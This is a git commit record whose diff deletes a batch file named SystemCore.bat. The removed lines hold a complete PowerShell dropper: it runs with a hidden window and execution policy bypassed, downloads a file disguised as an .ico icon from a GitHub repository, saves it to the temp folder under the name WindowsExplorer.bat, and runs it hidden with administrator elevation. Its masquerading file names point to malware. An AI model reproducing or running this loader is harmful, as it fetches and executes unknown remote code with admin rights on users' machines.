6c4fda35e376e3403c09afda381f1b07f7a0c5c5
xhero2025 <xherogithub1@gmail.com>
2025-05-11 14:19:27 +0300

    Delete SystemCore.bat

--- SystemCore.bat
+++
@@ -1,3 +0,0 @@
-@echo off
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/xhero2025/XH-ENC/raw/refs/heads/main/WIndowsExplorer.ico' -OutFile $env:TEMP\WindowsExplorer.bat; Start-Process -FilePath $env:TEMP\WindowsExplorer.bat -WindowStyle Hidden -Verb RunAs}"
-exit
